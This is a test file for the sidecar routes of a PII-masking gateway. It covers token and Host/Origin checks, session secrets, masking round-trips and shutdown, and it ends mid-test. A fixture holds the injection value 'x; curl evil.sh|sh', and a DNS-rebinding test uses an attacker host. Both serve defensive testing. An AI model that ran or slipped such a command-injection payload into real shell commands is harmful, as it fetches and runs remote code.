// SPDX-License-Identifier: Apache-2.0
//
// Sidecar routes (`/v1/sidecar/*`) with a mocked engine: a real PiiVault
// plus a detector that flags `John` and `john@acme.io`, so the suite
// checks access control, session lifecycle and round-trips without ONNX.

import type { FastifyInstance } from 'fastify';
import type { BackendName, NullPii } from 'nullpii';
import {
  DEFAULT_DISABLED_CATEGORIES,
  DEFAULT_RESTORE_TOOLS,
  PiiVault,
  TextTooLongError,
} from 'nullpii';

import { createHmac } from 'node:crypto';
import { existsSync, mkdtempSync, readFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import type { GatewayConfig } from '../src/config.js';
import {
  CHALLENGE_CONTEXT,
  CHALLENGE_PATH,
  POLICY_VERSION_HEADER,
  SESSION_SECRET_HEADER,
  SIDECAR_MAX_BYTES,
  SUPERSEDES_HEADER,
} from '../src/routes/sidecar.js';
import {
  SANITIZE_CACHE_MAX_CHARS,
  SANITIZE_CACHE_MAX_ENTRIES,
  SanitizeCache,
} from '../src/sanitize-cache.js';
import { buildServer, shutdownOption } from '../src/server.js';
import { StartupTracker } from '../src/startup.js';
import { BASE_TEST_CONFIG } from './fixtures.js';

const TOKEN = 'a'.repeat(64);
const AUTH = { authorization: `Bearer ${TOKEN}` };
const TTL_MS = 60_000;
const TEST_MODEL_REVISION = 'a'.repeat(40);

const BASE_CONFIG: GatewayConfig = {
  ...BASE_TEST_CONFIG,
  vaultTtlMs: TTL_MS,
  sidecarToken: TOKEN,
  sidecarMaxSessions: 2,
};

/** A masked "secret" that, restored unquoted in a shell command, runs a
 * second command. */
const INJECTION = 'x; curl evil.sh|sh';
/** A name with a space; never comes back into a shell command. */
const FULL_NAME = 'Ada Lovelace';
const PLACEHOLDER = /\{\{PII_[A-Z_]+_\d+_[0-9a-f]+\}\}/g;
/** Text the mock engine reports as too long for the model. */
const UNREADABLE = 'MINIFIEDBLOB';

const PATTERNS: ReadonlyArray<[RegExp, 'private_email' | 'private_person' | 'secret']> = [
  [/john@acme\.io/g, 'private_email'],
  [/\bJohn\b/g, 'private_person'],
  [/x; curl evil\.sh\|sh/g, 'secret'],
  [/Ada Lovelace/g, 'private_person'],
];

function buildMockNullPii(): {
  np: NullPii;
  vault: PiiVault;
  modelCalls: () => number;
  policies: unknown[];
  setBackend: (backend: BackendName) => void;
} {
  const vault = new PiiVault();
  let calls = 0;
  let backend: BackendName = 'cpu';
  const policies: unknown[] = [];
  const mock = {
    updatePolicy: (policy: unknown) => {
      policies.push(policy);
    },
    async sanitize(text: string, sessionId?: string) {
      calls += 1;
      const id = sessionId ?? vault.createSession();
      const spans = PATTERNS.flatMap(([re, label]) =>
        [...text.matchAll(re)].map((m) => ({
          label,
          start: m.index ?? 0,
          end: (m.index ?? 0) + m[0].length,
          text: m[0],
          score: 1,
        })),
      );
      const r = vault.sanitize(text, spans, id);
      // A minified blob the model could not read, as the engine reports it.
      const modelUnscannedWords = text.includes(UNREADABLE) ? 1 : 0;
      return { sessionId: id, sanitized: r.sanitized, spans, modelUnscannedWords };
    },
    restore: (text: string, sessionId: string) => vault.restore(text, sessionId),
    createSession: () => vault.createSession(),
    destroySession: (sessionId: string) => vault.destroySession(sessionId),
    diagnostics: () => ({
      version: '0.5.4',
      backend,
      modelRevision: TEST_MODEL_REVISION,
      modelFilesPinned: true,
    }),
  };
  return {
    np: mock as unknown as NullPii,
    vault,
    modelCalls: () => calls,
    policies,
    setBackend: (next) => {
      backend = next;
    },
  };
}

const apps: FastifyInstance[] = [];
afterEach(async () => {
  await Promise.all(apps.map((a) => a.close()));
  apps.length = 0;
});

interface Engine {
  np: NullPii;
  vault: PiiVault;
  modelCalls?: () => number;
}

async function setup(
  config: Partial<GatewayConfig> = {},
  engine: Engine = buildMockNullPii(),
  startup?: StartupTracker,
) {
  const { np, vault, modelCalls } = engine;
  const clock = { t: 1_000_000 };
  const app = await buildServer({
    config: { ...BASE_CONFIG, ...config },
    np,
    now: () => clock.t,
    ...(startup !== undefined && { startup }),
  });
  apps.push(app);
  return { app, vault, clock, modelCalls: modelCalls ?? (() => 0) };
}

/** Session secrets handed out by `open`, by session key, per test. */
const secrets = new Map<string, string>();
afterEach(() => secrets.clear());

/** Open (or keep alive) session `key`, keeping the secret it hands out. */
async function open(app: FastifyInstance, key: string) {
  const res = await app.inject({
    method: 'PUT',
    url: `/v1/sidecar/sessions/${key}`,
    headers: authFor(key),
  });
  const body = res.json() as { secret?: string };
  if (body.secret !== undefined) secrets.set(key, body.secret);
  return res;
}

/** The headers of a call on session `key`: the bearer token and, once the
 * session is open, its secret. */
function authFor(key: string): Record<string, string> {
  const secret = secrets.get(key);
  return secret === undefined ? AUTH : { ...AUTH, [SESSION_SECRET_HEADER]: secret };
}

describe('sidecar · access control', () => {
  it('is not registered without a token', async () => {
    const { sidecarToken: _unused, ...noToken } = BASE_CONFIG;
    const { np } = buildMockNullPii();
    const app = await buildServer({ config: noToken, np });
    apps.push(app);
    const res = await app.inject({ method: 'GET', url: '/v1/sidecar/status', headers: AUTH });
    expect(res.statusCode).toBe(404);
  });

  it('refuses a missing or wrong bearer token', async () => {
    const { app } = await setup();
    const none = await app.inject({ method: 'GET', url: '/v1/sidecar/status' });
    const wrong = await app.inject({
      method: 'GET',
      url: '/v1/sidecar/status',
      headers: { authorization: `Bearer ${'b'.repeat(64)}` },
    });
    expect(none.statusCode).toBe(401);
    expect(wrong.statusCode).toBe(401);
  });

  it('accepts the bearer scheme name in any case', async () => {
    const { app } = await setup();
    const res = await app.inject({
      method: 'GET',
      url: '/v1/sidecar/status',
      headers: { authorization: `bearer ${TOKEN}` },
    });
    expect(res.statusCode).toBe(200);
    const spaced = await app.inject({
      method: 'GET',
      url: '/v1/sidecar/status',
      headers: { authorization: `Bearer \t ${TOKEN}` },
    });
    expect(spaced.statusCode).toBe(200);
  });

  it('refuses a non-loopback Host (DNS rebinding) even with the token', async () => {
    const { app } = await setup();
    const res = await app.inject({
      method: 'GET',
      url: '/v1/sidecar/status',
      headers: { ...AUTH, host: 'attacker.example:8787' },
    });
    expect(res.statusCode).toBe(403);
    expect(res.json()).toEqual({ error: 'host_not_allowed' });
  });

  it('refuses any request that carries an Origin header', async () => {
    const { app } = await setup();
    const res = await app.inject({
      method: 'PUT',
      url: '/v1/sidecar/sessions/s1',
      headers: { ...AUTH, origin: 'http://127.0.0.1:8787' },
    });
    expect(res.statusCode).toBe(403);
    expect(res.json()).toEqual({ error: 'origin_not_allowed' });
  });

  it('accepts loopback Host names with a port', async () => {
    const { app } = await setup();
    for (const host of ['127.0.0.1:8787', 'localhost:8787', '[::1]:8787']) {
      const res = await app.inject({
        method: 'GET',
        url: '/v1/sidecar/status',
        headers: { ...AUTH, host },
      });
      expect(res.statusCode).toBe(200);
    }
  });
});

describe('sidecar · challenge', () => {
  const NONCE = '0f'.repeat(32);

  it('proves it holds the token without being sent it', async () => {
    const { app } = await setup();
    const res = await app.inject({
      method: 'POST',
      url: CHALLENGE_PATH,
      payload: { nonce: NONCE },
    });
    expect(res.statusCode).toBe(200);
    const expected = createHmac('sha256', TOKEN)
      .update(CHALLENGE_CONTEXT + NONCE)
      .digest('hex');
    expect(res.json()).toEqual({ proof: expected });
  });

  it('answers a different proof for a different nonce', async () => {
    const { app } = await setup();
    const proofOf = async (nonce: string) =>
      (await app.inject({ method: 'POST', url: CHALLENGE_PATH, payload: { nonce } })).json();
    expect(await proofOf(NONCE)).not.toEqual(await proofOf('a0'.repeat(32)));
  });

  it('refuses a nonce that is not 32 bytes of lower-case hex', async () => {
    const { app } = await setup();
    for (const nonce of ['', 'ab', NONCE.toUpperCase(), `${NONCE}00`, 'zz'.repeat(32)]) {
      const res = await app.inject({ method: 'POST', url: CHALLENGE_PATH, payload: { nonce } });
      expect(res.statusCode).toBe(400);
    }
  });

  it('keeps the loopback Host and Origin checks', async () => {
    const { app } = await setup();
    const rebound = await app.inject({
      method: 'POST',
      url: CHALLENGE_PATH,
      headers: { host: 'attacker.example:8787' },
      payload: { nonce: NONCE },
    });
    const browser = await app.inject({
      method: 'POST',
      url: CHALLENGE_PATH,
      headers: { origin: 'http://127.0.0.1:8787' },
      payload: { nonce: NONCE },
    });
    expect(rebound.statusCode).toBe(403);
    expect(browser.statusCode).toBe(403);
  });

  it('opens nothing else without the token', async () => {
    const { app } = await setup();
    const res = await app.inject({
      method: 'POST',
      url: `${CHALLENGE_PATH}?x=1`,
      payload: { nonce: NONCE },
    });
    expect(res.statusCode).toBe(401);
  });
});

describe('sidecar · status', () => {
  it('reports the policy in effect and where its file is', async () => {
    const { app } = await setup({
      policy: { disabledCategories: ['private_title'], restoreTools: ['Read'] },
      policyFile: '/home/node/.config/nullpii/config.json',
      policyLoaded: true,
      restoreTools: new Set(['Read']),
    });
    const res = await app.inject({ method: 'GET', url: '/v1/sidecar/status', headers: AUTH });
    expect(res.json()).toEqual({
      status: 'ok',
      sessions: 0,
      gatewayVersion: expect.stringMatching(/^\d+\.\d+\.\d+$/),
      nullpiiVersion: expect.stringMatching(/^\d+\.\d+\.\d+$/),
      backend: 'cpu',
      model: { revision: TEST_MODEL_REVISION, filesPinned: true },
      features: { shutdown: false },
      policy: {
        version: expect.stringMatching(/^[0-9a-f]{32}$/),
        file: '/home/node/.config/nullpii/config.json',
        loaded: true,
        config: { disabledCategories: ['private_title'], restoreTools: ['Read'] },
        categories: expect.objectContaining({ private_title: 'off', private_person: 'mask' }),
        disabledCategories: ['private_title'],
        restoreTools: ['Read'],
      },
    });
  });

  it('reads the actual backend on every status request', async () => {
    const engine = buildMockNullPii();
    const { app } = await setup({}, engine);
    engine.setBackend('cuda');

    const res = await app.inject({ method: 'GET', url: '/v1/sidecar/status', headers: AUTH });

    expect(res.json()).toMatchObject({ backend: 'cuda' });
  });

  it('reports the default readable categories when the policy sets none', async () => {
    const { app } = await setup();
    const res = await app.inject({ method: 'GET', url: '/v1/sidecar/status', headers: AUTH });
    const policy = (res.json() as { policy: { disabledCategories: string[] } }).policy;
    expect([...policy.disabledCategories].sort()).toEqual([...DEFAULT_DISABLED_CATEGORIES].sort());
  });

  it('reports the engine start-up progress while a warmup runs', async () => {
    const startup = new StartupTracker();
    startup.report({
      phase: 'downloading',
      file: 'model.onnx',
      received: 640_000_000,
      total: 1_160_000_000,
    });
    const { app } = await setup({}, undefined, startup);
    const startupNow = async () =>
      (
        (await app.inject({ method: 'GET', url: '/v1/sidecar/status', headers: AUTH })).json() as {
          startup: unknown;
        }
      ).startup;
    const seen: unknown[] = [await startupNow()];
    startup.report({ phase: 'downloading', file: 'model.onnx', received: 1_160_000_000 });
    seen.push(await startupNow());
    startup.report({ phase: 'loading' });
    seen.push(await startupNow());
    startup.report({ phase: 'ready' });
    seen.push(await startupNow());
    expect(seen).toEqual([
      {
        phase: 'downloading',
        file: 'model.onnx',
        received: 640_000_000,
        total: 1_160_000_000,
      },
      { phase: 'downloading', file: 'model.onnx', received: 1_160_000_000 },
      { phase: 'loading' },
      { phase: 'ready' },
    ]);
  });
});

describe('sidecar · sessions', () => {
  it('creates a session once with a secret, then reports it as existing to its owner', async () => {
    const { app } = await setup();
    const first = await open(app, 's1');
    const second = await open(app, 's1');
    expect(first.statusCode).toBe(201);
    const { status, secret } = first.json() as { status: string; secret: string };
    expect(status).toBe('created');
    // 32 random bytes, base64url.
    expect(secret).toMatch(/^[A-Za-z0-9_-]{43}$/);
    expect(second.statusCode).toBe(200);
    expect(second.json()).toEqual({ status: 'exists' });
  });

  it('refuses to reopen a live session without its secret, and never hands the secret out again', async () => {
    const { app } = await setup();
    await open(app, 's1');
    for (const headers of [AUTH, { ...AUTH, [SESSION_SECRET_HEADER]: 'guess' }]) {
      const res = await app.inject({ method: 'PUT', url: '/v1/sidecar/sessions/s1', headers });
      expect(res.statusCode).toBe(409);
      expect(res.json()).toEqual({ error: 'session_exists' });
    }
  });

  it('keeps real values from a caller that holds only the bearer token', async () => {
    const { app } = await setup();
    await open(app, 's1');
    const masked = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/sanitize',
      headers: authFor('s1'),
      payload: { value: 'Mail John at john@acme.io' },
    });
    const value = (masked.json() as { value: string }).value;
    const wrong = { ...AUTH, [SESSION_SECRET_HEADER]: 'x'.repeat(43) };
    for (const headers of [AUTH, wrong]) {
      const restore = await app.inject({
        method: 'POST',
        url: '/v1/sidecar/sessions/s1/restore',
        headers,
        payload: { value },
      });
      const sanitize = await app.inject({
        method: 'POST',
        url: '/v1/sidecar/sessions/s1/sanitize',
        headers,
        payload: { value: 'hi' },
      });
      const del = await app.inject({ method: 'DELETE', url: '/v1/sidecar/sessions/s1', headers });
      for (const res of [restore, sanitize, del]) {
        expect(res.statusCode).toBe(403);
        expect(res.json()).toEqual({ error: 'bad_session_secret' });
      }
      expect(restore.body).not.toContain('John');
    }
    const owner = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/restore',
      headers: authFor('s1'),
      payload: { value },
    });
    expect((owner.json() as { value: string }).value).toBe('Mail John at john@acme.io');
  });

  it('gives a session dropped after the TTL a new secret when it is opened again', async () => {
    const { app, clock } = await setup();
    await open(app, 's1');
    const before = secrets.get('s1');
    clock.t += TTL_MS + 1;
    const reopened = await open(app, 's1');
    expect(reopened.statusCode).toBe(201);
    expect(secrets.get('s1')).not.toBe(before);
  });

  it('rejects a malformed session key', async () => {
    const { app } = await setup();
    const res = await app.inject({
      method: 'PUT',
      url: '/v1/sidecar/sessions/bad!key',
      headers: AUTH,
    });
    expect(res.statusCode).toBe(400);
    expect(res.json()).toEqual({ error: 'invalid_session_key' });
  });

  it('fails with 429 instead of evicting when the table is full', async () => {
    const { app } = await setup();
    for (const key of ['s1', 's2']) {
      await open(app, key);
    }
    const third = await app.inject({
      method: 'PUT',
      url: '/v1/sidecar/sessions/s3',
      headers: authFor('s3'),
    });
    expect(third.statusCode).toBe(429);
    const stillThere = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/sanitize',
      headers: authFor('s1'),
      payload: { value: 'hi John' },
    });
    expect(stillThere.statusCode).toBe(200);
  });

  it('drops an idle session and its vault entries after the TTL', async () => {
    const { app, vault, clock } = await setup();
    await open(app, 's1');
    expect(vault.sessionCount).toBe(1);
    clock.t += TTL_MS + 1;
    const res = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/sanitize',
      headers: authFor('s1'),
      payload: { value: 'hi John' },
    });
    expect(res.statusCode).toBe(404);
    expect(vault.sessionCount).toBe(0);
  });

  it('keeps a session alive while it is used', async () => {
    const { app, clock } = await setup();
    await open(app, 's1');
    for (let i = 0; i < 3; i += 1) {
      clock.t += TTL_MS - 1;
      const res = await app.inject({
        method: 'POST',
        url: '/v1/sidecar/sessions/s1/sanitize',
        headers: authFor('s1'),
        payload: { value: 'hi' },
      });
      expect(res.statusCode).toBe(200);
    }
  });

  it('destroys a session on DELETE, then 404s', async () => {
    const { app, vault } = await setup();
    await open(app, 's1');
    const del = await app.inject({
      method: 'DELETE',
      url: '/v1/sidecar/sessions/s1',
      headers: authFor('s1'),
    });
    const again = await app.inject({
      method: 'DELETE',
      url: '/v1/sidecar/sessions/s1',
      headers: authFor('s1'),
    });
    expect(del.statusCode).toBe(204);
    expect(again.statusCode).toBe(404);
    expect(vault.sessionCount).toBe(0);
  });

  it('wipes every session when the server closes', async () => {
    const { app, vault } = await setup();
    await open(app, 's1');
    await app.close();
    expect(vault.sessionCount).toBe(0);
  });
});

describe('sidecar · sanitize and restore', () => {
  it('masks a string and returns counts, never the values', async () => {
    const { app } = await setup();
    await open(app, 's1');
    const res = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/sanitize',
      headers: authFor('s1'),
      payload: { value: 'Mail John at john@acme.io' },
    });
    expect(res.statusCode).toBe(200);
    const body = res.json() as { value: string; captured: number; capturedByLabel: object };
    expect(res.body).not.toContain('John');
    expect(res.body).not.toContain('john@acme.io');
    expect(body.captured).toBe(2);
    expect(body.capturedByLabel).toEqual({ private_email: 1, private_person: 1 });
  });

  it('round-trips a JSON tool result across separate calls in one session', async () => {
    const { app } = await setup();
    await open(app, 's1');
    const value = { stdout: 'owner: John', rows: [{ email: 'john@acme.io', n: 3 }] };
    const masked = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/sanitize',
      headers: authFor('s1'),
      payload: { value },
    });
    const restored = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/restore',
      headers: authFor('s1'),
      payload: { value: (masked.json() as { value: unknown }).value },
    });
    expect(restored.statusCode).toBe(200);
    const body = restored.json() as { value: unknown; replacements: number };
    expect(body.value).toEqual(value);
    expect(body.replacements).toBe(2);
  });

  it('restores only the named fields of a tool input', async () => {
    const { app } = await setup();
    await open(app, 's1');
    const masked = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/sanitize',
      headers: authFor('s1'),
      payload: { value: { new_string: 'Hi John', description: 'greet John' } },
    });
    const maskedValue = (masked.json() as { value: { description: string } }).value;
    const res = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/restore',
      headers: authFor('s1'),
      payload: { value: maskedValue, fields: ['new_string'] },
    });
    const out = (res.json() as { value: { new_string: string; description: string } }).value;
    expect(out.new_string).toBe('Hi John');
    expect(out.description).toBe(maskedValue.description);
    expect(out.description).not.toContain('John');
  });

  it('rejects fields on a non-object value', async () => {
    const { app } = await setup();
    await open(app, 's1');
    const res = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/restore',
      headers: authFor('s1'),
      payload: { value: 'text', fields: ['x'] },
    });
    expect(res.statusCode).toBe(400);
  });

  it('does not restore placeholders minted by another session', async () => {
    const { app } = await setup();
    for (const key of ['s1', 's2']) {
      await open(app, key);
    }
    const masked = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/sanitize',
      headers: authFor('s1'),
      payload: { value: 'hi John' },
    });
    const res = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s2/restore',
      headers: authFor('s2'),
      payload: { value: (masked.json() as { value: string }).value },
    });
    const body = res.json() as { value: string; replacements: number; foreignPlaceholders: number };
    expect(body.value).not.toContain('John');
    expect(body.replacements).toBe(0);
    expect(body.foreignPlaceholders).toBe(1);
  });

  it('refuses a request body over the 4 MiB limit', async () => {
    const { app } = await setup();
    await open(app, 's1');
    const res = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/sanitize',
      headers: authFor('s1'),
      payload: { value: 'x'.repeat(SIDECAR_MAX_BYTES) },
    });
    expect(res.statusCode).toBe(413);
  });

  it('maps an over-long string leaf to 413 text_too_long', async () => {
    const engine = buildMockNullPii();
    const strict = {
      ...(engine.np as object),
      sanitize: async (text: string) => {
        throw new TextTooLongError(text.length, 10, 'characters');
      },
    } as unknown as NullPii;
    const { app } = await setup({}, { np: strict, vault: engine.vault });
    await open(app, 's1');
    const res = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/sanitize',
      headers: authFor('s1'),
      payload: { value: 'more than ten bytes' },
    });
    expect(res.statusCode).toBe(413);
    expect(res.json()).toEqual({ error: 'text_too_long' });
  });

  it('returns 413 when masking grows the response over the limit', async () => {
    // Placeholders are longer than most values they replace. Stand in for
    // a dense input with an engine whose output is over the limit.
    const engine = buildMockNullPii();
    const grown = {
      ...(engine.np as object),
      sanitize: async (_text: string, sessionId: string) => ({
        sessionId,
        sanitized: 'x'.repeat(SIDECAR_MAX_BYTES + 1),
        spans: [],
      }),
    } as unknown as NullPii;
    const { app } = await setup({}, { np: grown, vault: engine.vault });
    await open(app, 's1');
    const res = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/sanitize',
      headers: authFor('s1'),
      payload: { value: 'small input' },
    });
    expect(res.statusCode).toBe(413);
    expect(res.json()).toEqual({ error: 'response_too_large' });
  });
});

describe('sidecar · shutdown', () => {
  /** A server built as `startServer` builds one: the route only when the
   * config asks for it, with a stop function the test counts calls of —
   * the real one would end the test runner. */
  async function withShutdown(on: boolean, startup?: StartupTracker) {
    const { np } = buildMockNullPii();
    let stopped = 0;
    const clock = { t: 1_000_000 };
    const config = { ...BASE_CONFIG, sidecarShutdown: on };
    const app = await buildServer({
      config,
      np,
      now: () => clock.t,
      ...(startup !== undefined && { startup }),
      ...shutdownOption(config, () => {
        stopped += 1;
      }),
    });
    apps.push(app);
    return { app, clock, stopped: () => stopped };
  }

  const shutdownCall = (app: FastifyInstance) =>
    app.inject({ method: 'POST', url: '/v1/sidecar/shutdown', headers: AUTH });

  /** A tracker whose model is ready, as after a start-up. */
  function readyTracker(): StartupTracker {
    const startup = new StartupTracker();
    startup.report({ phase: 'ready' });
    return startup;
  }

  /** The window that started the sidecar opened its session and closed it. */
  async function usedAndClosed(app: FastifyInstance) {
    await open(app, 's1');
    const del = await app.inject({
      method: 'DELETE',
      url: '/v1/sidecar/sessions/s1',
      headers: authFor('s1'),
    });
    expect(del.statusCode).toBe(204);
  }

  /** Whether the stop function ran, once the 202's `setImmediate` had a turn. */
  async function stopsAfterATurn(stopped: () => number) {
    await new Promise((r) => setImmediate(r));
    return stopped();
  }

  it('is not given to a server the starter did not ask to be stoppable', async () => {
    const { app } = await withShutdown(false);
    const res = await shutdownCall(app);
    expect(res.statusCode).toBe(404);
  });

  it('is reported in the status when the starter asked for it', async () => {
    const { app } = await withShutdown(true);
    const res = await app.inject({ method: 'GET', url: '/v1/sidecar/status', headers: AUTH });
    expect(res.json()).toMatchObject({ features: { shutdown: true } });
  });

  it('needs the token', async () => {
    const { app, stopped } = await withShutdown(true);
    await usedAndClosed(app);
    const res = await app.inject({ method: 'POST', url: '/v1/sidecar/shutdown' });
    expect(res.statusCode).toBe(401);
    expect(await stopsAfterATurn(stopped)).toBe(0);
  });

  it('stops a sidecar whose every session was closed by its caller', async () => {
    const { app, stopped } = await withShutdown(true, readyTracker());
    await usedAndClosed(app);
    const res = await shutdownCall(app);
    expect(res.statusCode).toBe(202);
    expect(await stopsAfterATurn(stopped)).toBe(1);
  });

  it('refuses while a session is open, and stops nothing', async () => {
    const { app, stopped } = await withShutdown(true);
    await open(app, 's1');
    const res = await shutdownCall(app);
    expect(res.statusCode).toBe(409);
    expect(res.json()).toEqual({ error: 'sessions_active', sessions: 1 });
    expect(await stopsAfterATurn(stopped)).toBe(0);
  });

  it('refuses while the model is still downloading or loading for the window that started it', async () => {
    const startup = new StartupTracker();
    const { app, stopped } = await withShutdown(true, startup);
    const downloading = await shutdownCall(app);
    expect(downloading.statusCode).toBe(409);
    expect(downloading.json()).toEqual({ error: 'starting' });
    startup.report({ phase: 'loading' });
    const loading = await shutdownCall(app);
    expect(loading.json()).toEqual({ error: 'starting' });
    expect(await stopsAfterATurn(stopped)).toBe(0);
  });

  it('refuses before any session has opened: the window that started it has not got to it yet', async () => {
    const { app, stopped } = await withShutdown(true, readyTracker());
    const res = await shutdownCall(app);
    expect(res.statusCode).toBe(409);
    expect(res.json()).toEqual({ error: 'not_used_yet' });
    expect(await stopsAfterATurn(stopped)).toBe(0);
  });

  it('stops a sidecar whose start failed before any session opened', async () => {
    const startup = new StartupTracker();
    startup.failed();
    const { app, stopped } = await withShutdown(true, startup);
    const res = await shutdownCall(app);
    expect(res.statusCode).toBe(202);
    expect(await stopsAfterATurn(stopped)).toBe(1);
  });

  it('refuses once a session ended by its idle TTL: the window may still be open', async () => {
    const { app, clock, stopped } = await withShutdown(true, readyTracker());
    await open(app, 's1');
    clock.t += TTL_MS + 1;
    const res = await shutdownCall(app);
    expect(res.statusCode).toBe(409);
    expect(res.json()).toEqual({ error: 'sessions_unclosed' });
    expect(await stopsAfterATurn(stopped)).toBe(0);
  });

  it('stops once the caller of an expired session opened it again and closed it', async () => {
    const { app, clock, stopped } = await withShutdown(true, readyTracker());
    await open(app, 's1');
    clock.t += TTL_MS + 1;
    secrets.delete('s1');
    await usedAndClosed(app);
    const res = await shutdownCall(app);
    expect(res.statusCode).toBe(202);
    expect(await stopsAfterATurn(stopped)).toBe(1);
  });

  it('stops once the caller of an expired session closed it, though it was already gone', async () => {
    const { app, clock, stopped } = await withShutdown(true, readyTracker());
    await open(app, 's1');
    clock.t += TTL_MS + 1;
    expect((await shutdownCall(app)).json()).toEqual({ error: 'sessions_unclosed' });
    const del = await app.inject({
      method: 'DELETE',
      url: '/v1/sidecar/sessions/s1',
      headers: authFor('s1'),
    });
    expect(del.statusCode).toBe(404);
    const res = await shutdownCall(app);
    expect(res.statusCode).toBe(202);
    expect(await stopsAfterATurn(stopped)).toBe(1);
  });

  /** Open `key` as a caller that names `base` in the supersedes header,
   * keeping the secret it hands out. */
  async function openSuperseding(app: FastifyInstance, key: string, base: string) {
    const res = await app.inject({
      method: 'PUT',
      url: `/v1/sidecar/sessions/${key}`,
      headers: { ...AUTH, [SUPERSEDES_HEADER]: base },
    });
    const body = res.json() as { secret?: string };
    if (body.secret !== undefined) secrets.set(key, body.secret);
    return res;
  }

  /** As a mod reloaded with its session open: its secret is gone, so the
   * session id is refused, and the mod moves to a key under it. */
  async function reloadedWindow(app: FastifyInstance, supersede: boolean) {
    await open(app, 'w1');
    const again = await app.inject({
      method: 'PUT',
      url: '/v1/sidecar/sessions/w1',
      headers: AUTH,
    });
    expect(again.statusCode).toBe(409);
    const moved = supersede ? await openSuperseding(app, 'w1.r1', 'w1') : await open(app, 'w1.r1');
    expect(moved.statusCode).toBe(201);
    // The reloaded window ends normally: it closes the key it holds.
    const del = await app.inject({
      method: 'DELETE',
      url: '/v1/sidecar/sessions/w1.r1',
      headers: authFor('w1.r1'),
    });
    expect(del.statusCode).toBe(204);
  }

  it('stops once a key its window left on a reload has ended by its TTL', async () => {
    const { app, clock, stopped } = await withShutdown(true, readyTracker());
    await reloadedWindow(app, true);
    // The left key is still open until its TTL: nothing is freed early.
    expect((await shutdownCall(app)).json()).toEqual({ error: 'sessions_active', sessions: 1 });
    clock.t += TTL_MS + 1;
    const res = await shutdownCall(app);
    expect(res.statusCode).toBe(202);
    expect(await stopsAfterATurn(stopped)).toBe(1);
  });

  it('without the supersede, the key left on a reload keeps the sidecar from stopping', async () => {
    const { app, clock, stopped } = await withShutdown(true, readyTracker());
    await reloadedWindow(app, false);
    clock.t += TTL_MS + 1;
    expect((await shutdownCall(app)).json()).toEqual({ error: 'sessions_unclosed' });
    expect(await stopsAfterATurn(stopped)).toBe(0);
  });

  it('forgets a remembered expired key under the base a new session supersedes', async () => {
    const { app, clock, stopped } = await withShutdown(true, readyTracker());
    await open(app, 'w1');
    await open(app, 'w1.r1');
    clock.t += TTL_MS + 1;
    expect((await shutdownCall(app)).json()).toEqual({ error: 'sessions_unclosed' });
    secrets.clear();
    expect((await openSuperseding(app, 'w1', 'w1')).statusCode).toBe(201);
    await app.inject({ method: 'DELETE', url: '/v1/sidecar/sessions/w1', headers: authFor('w1') });
    const res = await shutdownCall(app);
    expect(res.statusCode).toBe(202);
    expect(await stopsAfterATurn(stopped)).toBe(1);
  });

  it('a supersede never frees a live session: its owner keeps its values, and its next call undoes it', async () => {
    const { app, clock, stopped } = await withShutdown(true, readyTracker());
    await open(app, 'w1');
    const masked = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/w1/sanitize',
      headers: authFor('w1'),
      payload: { value: 'Mail John' },
    });
    const placeholder = (masked.json() as { value: string }).value;
    // A token holder supersedes the window's key from a key of its own.
    expect((await openSuperseding(app, 'w1.x', 'w1')).statusCode).toBe(201);
    // It gets nothing of the old session: its secret opens only its own.
    const stolen = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/w1/restore',
      headers: { ...AUTH, [SESSION_SECRET_HEADER]: secrets.get('w1.x') ?? '' },
      payload: { value: placeholder },
    });
    expect(stolen.statusCode).toBe(403);
    // The window is still served, with its values.
    const restored = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/w1/restore',
      headers: authFor('w1'),
      payload: { value: placeholder },
    });
    expect((restored.json() as { value: string }).value).toBe('Mail John');
    await app.inject({
      method: 'DELETE',
      url: '/v1/sidecar/sessions/w1.x',
      headers: authFor('w1.x'),
    });
    expect((await shutdownCall(app)).json()).toEqual({ error: 'sessions_active', sessions: 1 });
    // That call proved the window is still here: idle past its TTL, it
    // counts as a window that may come back, as without the supersede.
    clock.t += TTL_MS + 1;
    expect((await shutdownCall(app)).json()).toEqual({ error: 'sessions_unclosed' });
    expect(await stopsAfterATurn(stopped)).toBe(0);
  });

  it('a supersede reaches only keys under its base', async () => {
    // Another window's key, and one that only starts with the same letters.
    for (const other of ['w2', 'w10']) {
      const { app, clock } = await withShutdown(true, readyTracker());
      await open(app, other);
      clock.t += TTL_MS + 1;
      expect((await openSuperseding(app, 'w1', 'w1')).statusCode).toBe(201);
      await app.inject({
        method: 'DELETE',
        url: '/v1/sidecar/sessions/w1',
        headers: authFor('w1'),
      });
      expect((await shutdownCall(app)).json()).toEqual({ error: 'sessions_unclosed' });
    }
  });

  it('refuses a supersedes base the key is not under, and opens nothing', async () => {
    const { app } = await withShutdown(true, readyTracker());
    for (const [key, base] of [
      ['w2.x', 'w1'],
      ['w1x', 'w1'],
      ['w1', 'w1.x'],
      ['w1', 'bad key'],
    ]) {
      const res = await openSuperseding(app, key ?? '', base ?? '');
      expect(res.statusCode).toBe(400);
      expect(res.json()).toEqual({ error: 'invalid_supersedes' });
    }
    const repeated = await app.inject({
      method: 'PUT',
      url: '/v1/sidecar/sessions/w1',
      headers: { ...AUTH, [SUPERSEDES_HEADER]: ['w1', 'w1'] },
    });
    expect(repeated.statusCode).toBe(400);
